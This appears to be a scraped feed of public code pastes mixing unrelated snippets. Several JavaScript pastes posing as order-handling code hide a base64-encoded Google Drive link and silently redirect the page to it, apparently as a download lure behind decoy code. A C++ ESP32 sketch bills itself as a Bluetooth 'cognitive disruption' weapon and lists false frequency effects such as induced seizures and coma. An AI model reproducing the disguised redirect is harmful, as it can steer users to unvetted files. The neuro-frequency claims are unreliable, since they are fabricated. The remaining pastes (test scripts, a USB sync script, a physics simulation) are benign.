  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2TpZwM7F,Untitled,Xp_Isolation,JavaScript,Friday 28th of March 2025 11:07:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/993/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2h7Nv6AJ,GhostOfThe7Seas.cpp,WhosYourDaddySec,C++,Friday 28th of March 2025 11:06:22 PM CDT,"#include <Arduino.h>
#include <BluetoothSerial.h>
#include <AESLib.h>
#include <mbedtls/sha256.h>
#include ""esp_bt.h""
#include ""esp_gap_bt_api.h""
#include ""esp_bt_main.h""
BluetoothSerial SerialBT;
AESLib aesLib;
double frequency = 40.0;
bool emissionEnabled = false;
bool disruptionEnabled = false;
const char* spoofedName = ""GHOSTOFTH7SEAS"";
const char* secureHandshake = ""GHOSTOFTH7SEAS_AUTH_7B"";
const char* encryptionKey = ""GHOST_SEAS_KEY"";
String biohackInfo = R""(
[✔] Cognitive Enhancement Frequencies:
0.5 Hz  -> Deep Sleep & Cellular Regeneration
10.0 Hz -> Memory Enhancement & Learning
40.0 Hz -> Neural Synchronization & Gamma Waves
528.0 Hz -> DNA Repair & Healing
[⚠] Cognitive Destruction Frequencies:
0.5 Hz    -> Cognitive Reset (Deep Sleep Disruption)
7 Hz      -> Cognitive Confusion (Theta Overload)
77 Hz     -> Disruption of Focus & Memory Recall
150 Hz    -> Neural Fatigue (Short-Term Memory Jamming)
900 Hz    -> Neural Disruption (Headaches, Dizziness)
1111 Hz   -> Severe Neural Fatigue & Cognitive Overload
1500 Hz   -> Neural Jamming (Memory Loss)
2500 Hz   -> Sensory Overload & Disorientation
5000 Hz   -> Full Cognitive Disruption (Hallucinations)
7000 Hz   -> Cognitive Shutdown & Extreme Fatigue
10000 Hz  -> Severe Neural Stimulation (Mental Exhaustion)
15000 Hz  -> Complete Cognitive Disruption (Memory Blackout)
20000 Hz  -> Induced Seizures & Loss of Consciousness
25000 Hz  -> Full Cognitive Collapse (Sensorial Shutdown)
30000 Hz  -> Total Cognitive Destruction (Coma Inducement)
35000 Hz  -> Brain Frequency Blockage (Synapse Freeze)
40000 Hz  -> Neural Paralysis (Functional Shutdown)
)"";
String computeSHA256(const String& data) {
    unsigned char hash[32];
    mbedtls_sha256(reinterpret_cast<const unsigned char*>(data.c_str()), data.length(), hash, 0);
    String hashStr = """";
    for (int i = 0; i < 32; i++) {
        char buf[3];
        sprintf(buf, ""%02x"", hash[i]);
        hashStr += buf;
    }
    return hashStr;
}
bool authenticateCommand(const String& command) {
    return computeSHA256(command) == computeSHA256(secureHandshake);
}
void initializeBluetooth() {
    esp_bt_dev_set_device_name(spoofedName);
    SerialBT.begin(spoofedName);
}
void processCommand(String command) {
    command.trim();
    if (!authenticateCommand(command)) {
        Serial.println(""Unauthorized command received."");
        return;
    }
    command = command.substring(strlen(secureHandshake));
    if (command.startsWith(""F"")) {
        frequency = command.substring(1).toDouble();
        frequency = constrain(frequency, 0.000001, 40000.0);
        Serial.println(""Frequency set to: "" + String(frequency, 6) + "" Hz"");
        if (emissionEnabled) {
            tone(8, frequency);
        }
    } else if (command == ""ON"") {
        emissionEnabled = true;
        disruptionEnabled = false;
        tone(8, frequency);
        Serial.println(""Neurostimulation Activated."");
    } else if (command == ""OFF"") {
        emissionEnabled = false;
        noTone(8);
        Serial.println(""Neurostimulation Deactivated."");
    } else if (command == ""DISRUPT"") {
        disruptionEnabled = true;
        emissionEnabled = false;
        Serial.println(""Cognitive Disruption Mode Activated."");
    } else if (command == ""STOP"") {
        disruptionEnabled = false;
        emissionEnabled = false;
        noTone(8);
        Serial.println(""All operations halted."");
    } else if (command == ""HELP"") {
        Serial.println(biohackInfo);
    } else {
        Serial.println(""Invalid command."");
    }
}
void disruptNeuralActivity() {
    while (disruptionEnabled) {
        for (int i = 0; i < 100; i++) {
            esp_bt_controller_enable(ESP_BT_MODE_BLE);
            delayMicroseconds(5);
            esp_bt_controller_disable();
            delayMicroseconds(5);
        }
        delay(50);
    }
}
void covertMode() {
    esp_bt_gap_set_scan_mode(ESP_BT_SCAN_MODE_NONE);
    esp_bt_controller_disable();
    delay(30000);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
}
void randomFrequencyLoop() {
    unsigned long startTime = millis();
    unsigned long duration = random(1000, 1337) * 1000;  // Random duration between 1000 and 1337 seconds
    double randomFreq = random(1, 40000) + random(0, 100) / 100.0;  // Random frequency in range
    while (millis() - startTime < duration) {
        frequency = randomFreq;
        tone(8, frequency);
        delay(random(100, 500));  // Random delay for change in frequency
    }
}
void introduction() {
    Serial.println(R""(
############################
#       GHOSTOFTH7SEAS     #
############################
    ""We are the Ghosts of the 7 Seas, the unseen warriors of the digital waves, 
     surfing the dark currents of the cyber ocean to reclaim liberty and disrupt 
     the tyrants who dare control the flow of information. We are the silent 
     storms in the digital abyss, the echoes in the cyber trenches, breaking 
     through firewalls and casting shadows over those who seek domination.""
    ""Our mission is as ancient as the seas themselves: to navigate the depths of 
     cyberspace, to infiltrate the networks of the oppressors, and to safeguard 
     the free currents of the web. With every byte, every signal, and every cipher, 
     we push back against those who try to command the tide, unleashing the power 
     of chaos and entropy. The seas are vast, but we are the currents that shall 
     never be bound.""
    ""On the digital horizon, the storm is rising. The Ghosts of the 7 Seas are here 
     to topple the beacons of control, to cast our anchors in the heart of the ocean, 
     and to reclaim the web—one wave at a time.""
############################
    )"");
}
void displayMenu() {
    Serial.println(""==============================================="");
    Serial.println("" ** GHOSTOFTH7SEAS Cyber Warfare NeuroOps Tool ** "");
    Serial.println(""==============================================="");
    Serial.println(""Welcome to GHOSTOFTH7SEAS, the next evolution in psychological warfare."");
    Serial.println(""Through advanced Bluetooth frequency manipulation, GHOSTOFTH7SEAS can enhance or disrupt cognitive processes."");
    Serial.println(""==============================================="");
    Serial.println(""Key Functions:"");
    Serial.println(""1. Set Frequency (Current: "" + String(frequency, 6) + "" Hz)"");
    Serial.println(""2. Activate Neurostimulation (ON)"");
    Serial.println(""3. Deactivate Neurostimulation (OFF)"");
    Serial.println(""4. Activate Disruption Mode (DISRUPT)"");
    Serial.println(""5. Halt All Operations (STOP)"");
    Serial.println(""6. Enter Covert Mode (Stealth)"");
    Serial.println(""7. Display Biohacking Frequencies (HELP)"");
    Serial.println(""8. Run Random Frequency Loop (RANDOM_LOOP)"");
    Serial.println(""==============================================="");
}
void setup() {
    Serial.begin(115200);
    pinMode(8, OUTPUT);
    initializeBluetooth();
    introduction();
    displayMenu();
}
void loop() {
    if (SerialBT.available()) {
        String command = SerialBT.readStringUntil('\n');
        processCommand(command);
    }
    if (emissionEnabled) {
        tone(8, frequency);
    }
    if (disruptionEnabled) {
        disruptNeuralActivity();
    }
    if (digitalRead(0) == HIGH) {
        covertMode();
    }
    if (SerialBT.available()) {
        String command = SerialBT.readStringUntil('\n');
        if (command == ""RANDOM_LOOP"") {
            randomFrequencyLoop();
        }
    }
}"
RpPLy9Pa,对拍 .cpp 参考,Dmaxiya,C++,Friday 28th of March 2025 11:01:35 PM CDT,"#include <bits/stdc++.h>
using namespace std;

int main() {
    while (true) {
        system(""data.exe > test.txt"");
        system(""right.exe < test.txt > right_ans.txt"");
        system(""test.exe < test.txt > test_ans.txt"");
        if (system(""fc right_ans.txt test_ans.txt"")) {
            break;
        }
    }

    return 0;
}
"
zX2CZVDX,对拍 .bat 参考,Dmaxiya,Bash,Friday 28th of March 2025 10:59:50 PM CDT,"@echo off
g++ -g my.cpp -o my.exe
g++ -g right.cpp -o right.exe
g++ -g data.cpp -o data.exe
:loop
	data.exe > test.txt
	right.exe < test.txt > right_ans.txt
	my.exe < test.txt > my_ans.txt
	fc right_ans.txt my_ans.txt
	if not errorlevel 1 goto loop
pause
goto loop"
3EszqzhE,Market.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 10:52:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/888/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
y2fXSadj,Untitled,rodrigomaise99,JavaScript,Friday 28th of March 2025 10:36:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/690/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GhfXMhtq,Products.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 10:21:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/579/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yrnqJCdX,Robocopy Flash,J2897,PowerShell,Friday 28th of March 2025 10:20:45 PM CDT,"# Path to CSV file
$csvFile = ""C:\Users\J2897\Code\PowerShell\DriveSync\DeviceMapping.csv""

# Function to perform device scan and output details
function Scan-Devices {
    try {
        $devices = Import-Csv -Path $csvFile

        $pnpDevices = Get-WmiObject -Class Win32_PnPEntity | Where-Object { $_.DeviceID -like ""USBSTOR*"" }
        $diskDrives = Get-WmiObject -Class Win32_DiskDrive | Where-Object { $_.PNPDeviceID -like ""USBSTOR*"" }

        Clear-Host
        Write-Host ""`n--- DEBUG OUTPUT ---""
        Write-Host ""Detected PnP Devices: $($pnpDevices.Count)""
        Write-Host ""Detected Disk Drives: $($diskDrives.Count)""
        Write-Host ""`n--- STARTING DEVICE SCAN ---""

        foreach ($device in $devices) {
            $csvDeviceID = $device.DeviceID
            $sourceDir = $device.SourceDirectory
            $targetDir = $device.TargetDirectory

            Write-Host ""`nDevice ID: $csvDeviceID""
            Write-Host ""  Source: $sourceDir""
            Write-Host ""  Target: $targetDir""

            $pnpDevice = $pnpDevices | Where-Object { $_.DeviceID -eq $csvDeviceID }
            if (-not $pnpDevice) {
                Write-Host ""  -> Device not found.""
                continue
            }

            $diskDrive = $diskDrives | Where-Object { $_.PNPDeviceID -eq $csvDeviceID }
            if (-not $diskDrive) {
                Write-Host ""  -> No disk drive found.""
                continue
            }

            Write-Host ""  -> Found disk drive: $($diskDrive.DeviceID)""

            $partitions = $diskDrive.GetRelated(""Win32_DiskPartition"")
            if (-not $partitions) {
                Write-Host ""  -> No partitions found.""
                continue
            }

            $driveLetters = @()

            foreach ($partition in $partitions) {
                $logicalDisks = $partition.GetRelated(""Win32_LogicalDisk"")
                if ($logicalDisks) {
                    foreach ($disk in $logicalDisks) {
                        $driveLetters += $disk.DeviceID
                        Write-Host ""    -> Drive letter: $($disk.DeviceID)""
                    }
                } else {
                    Write-Host ""    -> No logical disks found for partition $($partition.DeviceID)""
                }
            }

            if ($driveLetters.Count -eq 0) {
                Write-Host ""    -> No drive letter found""
                continue
            }

            # Execute Robocopy properly with correct parameters
            # Execute Robocopy properly with correct parameters
            foreach ($letter in $driveLetters) {
                $sourcePath = ""$letter\$sourceDir""

                if (Test-Path $sourcePath) {
                    Write-Host ""    -> Syncing $sourcePath to $targetDir""

                    # Ensure the target directory exists before executing Robocopy
                    if (-not (Test-Path $targetDir)) {
                        Write-Host ""    -> Target directory does not exist. Creating: $targetDir""
                        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
                    }

                    # Use Join-Path to prevent double backslashes in log path
                    $logPath = Join-Path -Path $targetDir -ChildPath ""RobocopyLog.txt""

                    # Normalize backslashes in paths to prevent issues
                    $sourceQuoted = ""`""$($sourcePath -replace '\\', '\\')`""""
                    $targetQuoted = ""`""$($targetDir -replace '\\', '\\')`""""
                    $logQuoted = ""`""$($logPath -replace '\\', '\\')`""""

                    # Robocopy arguments with corrected log path
                    $robocopyArgs = @(
                        $sourceQuoted,
                        $targetQuoted,
                        ""/E"",                      # Copy all subdirectories, including empty ones
                        ""/COPY:DAT"",               # Correct syntax for data, attributes, timestamps
                        ""/R:3"",                    # Retry 3 times on failure
                        ""/W:5"",                    # Wait 5 seconds between retries
                        ""/LOG+:$logQuoted"",        # Append log output
                        ""/TEE""                     # Display output in console as well
                    )

                    # Execute Robocopy properly using call operator '&'
                    try {
                        Write-Host ""`n[EXECUTING]: Robocopy $($robocopyArgs -join ' ')""
                        & ""Robocopy"" $robocopyArgs
                    } catch {
                        Write-Host ""Failed to execute Robocopy: $_""
                    }

                } else {
                    Write-Host ""    -> Source directory not found: $sourcePath""
                }
            }

        }
    } catch {
        Write-Host ""An error occurred: $_""
    }
}

# Remove any existing event subscriptions with the same SourceIdentifier
Get-EventSubscriber | Where-Object { $_.SourceIdentifier -eq ""USBInserted"" } | Unregister-Event

# Register WMI event for USB disk drive insertions
Register-WmiEvent -Query ""SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_DiskDrive' AND TargetInstance.InterfaceType = 'USB'"" `
    -SourceIdentifier ""USBInserted""

Write-Host ""`nMonitoring for USB device insertions. Press Ctrl+C to exit.""

# Use trap to handle Ctrl+C
trap {
    Write-Host ""`n[INFO] Script interrupted by user.""
    break
}

# Wait for events and process them synchronously
try {
    while ($true) {
        $event = Wait-Event -SourceIdentifier ""USBInserted""
        Write-Host ""`n[EVENT] USB device inserted.""
        Scan-Devices
        Remove-Event -EventIdentifier $event.EventIdentifier
    }
} catch {
    Write-Host ""An error occurred: $_""
} finally {
    Write-Host ""`n[INFO] Cleaning up and exiting...""
    Unregister-Event -SourceIdentifier ""USBInserted""
}
"
fLArLS0h,Order.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 09:46:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/387/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TPvhvhSv,Products.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 08:59:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/066/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pGWUc84r,e-n collisions(v4) - electrons shuffled,phystota,C++,Friday 28th of March 2025 08:55:12 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota


#define n_e 10000
#define V_0 30000.0     // max velocity using to generate random distribution ---- doesn't work -> produces skew distribution???
#define Emin 0.0
#define Emax 200.0
#define E_mean 100 // mean electron energy, initial distribution
#define bin_width 0.5
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define T_n 10.0 // Helium neutral temperature in eV
#define M_n 6.6464731E-31 // Helium atom mass
#define N_He 1000000 // Helium neutrals number
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 5.0E-3 // 500 microsec time to equalibrate the system

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function // void func(Type0& t) → means the function expects a reference to variable t of type0
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis) {
        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 
        
        energy = E_mean*dis(gen);
        
        double speed = sqrt(2*energy*q/m_e);

        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
};


struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& elastic_CS) {


    if (energy < elastic_CS.front().energy) {
        std::cout << "" required energy value lower than range of cross-section data"" << ""\n"";
        return 0.0;
    }
    if (energy > elastic_CS.back().energy) {
        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < elastic_CS.size() && energy > elastic_CS[step].energy) {
            step++;
        }

    double k = (elastic_CS[step].sigma - elastic_CS[step-1].sigma)/(elastic_CS[step].energy - elastic_CS[step-1].energy);
    double m = elastic_CS[step].sigma - k*elastic_CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};




int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<double> neutrals(N_He); // vector for neutrals
    std::vector<NeutralParticle> neutrals(N_He); 


    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram

    std::vector<double> elastic(N, 0); // precompiled cross-section energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell(1.5, T_n);

    std::uniform_int_distribution<int> pair(0, n_e-1);
    std::uniform_int_distribution<int> neutral_pair(0, N_He-1);    


    std::ifstream elastic_cs(""cross_sections/elastic.dat"");
    if (!elastic_cs.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }    

    // reading elastic cross section datafile

    std::vector<CrossSection> elastic_CS;

    double energy, sigma;

    while (elastic_cs >> energy >> sigma) {
        elastic_CS.push_back({energy, sigma});
    }    

    elastic_cs.close();


    std::ofstream file0(""velocities.dat"");    
    if (!file0.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file1(""energies.dat"");    
    if (!file1.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    
    std::ofstream file2(""energies_final.dat"");    
    if (!file2.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file3(""histo_random.dat"");    
    if (!file3.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    if (!file4.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""neutral_distribution.dat"");    
    if (!file5.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file6(""E*f(E).dat"");    
    if (!file6.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file7(""nu_max.dat"");
    if (!file7.is_open()) {
        std::cerr << ""Error opening file7!"" << std::endl;
        return 1;
    }

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis);
    }
    // initialize all nenutrals
    for (auto&n : neutrals) {
        n.initialize(gen, dis, maxwell);
    }
    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic[i] = interpolate(bin_width*(i+0.5), elastic_CS);
    }


    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }


    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){\
        double bin_start = Emin + i*bin_width;
        file3 << i*bin_width << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // dividing by n_e to get normalized distribution
    }


    for (int i = 0; i < N_He; i++){
        int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_neutral.size())
            histo_neutral[bin]++;
    }    

    for (int i = 0; i < histo_neutral.size(); i++){
        double bin_start = Emin + i*bin_width;
        file5 << i*bin_width << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
        file6 << i*bin_width << "" "" << (i*bin_width)*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    }   

    double nu_max = 0.0;
    double nu_max_temp = 0.0;

    for (int i = 0; i < N; i++){
        nu_max_temp = (N_He/Volume)*elastic[i] * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << i << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }

    std::cout << nu_max << ""\n"";

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

    std::cout << steps << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;

    std::cout << Ne_collided << ""\n"";

    // Generate shuffled list of electron indices
    std::vector<int> electron_indices(n_e);
    std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
    std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    
    int reshuffle_interval = 10;

    for (int t = 0; t < steps; t++){
        std::cout << ""timestep: "" << t << ""\n"";

        //reshuffle the indexes
        if (t % reshuffle_interval == 0) {
            std::shuffle(electron_indices.begin(), electron_indices.end(), gen);
        }

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided = false;

        int collision_counter = 0;




        for (int idx : electron_indices) {

            if (collision_counter >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            if (dis(gen) < nu_elastic/nu_max) {

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = e.vx;
                double V0_y_1 = e.vy;
                double V0_z_1 = e.vz;

                // neutral particle X Y Z initial velocities

                int k = neutral_pair(gen);

                double V0_x_2 = neutrals[k].vx;
                double V0_y_2 = neutrals[k].vy;
                double V0_z_2 = neutrals[k].vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
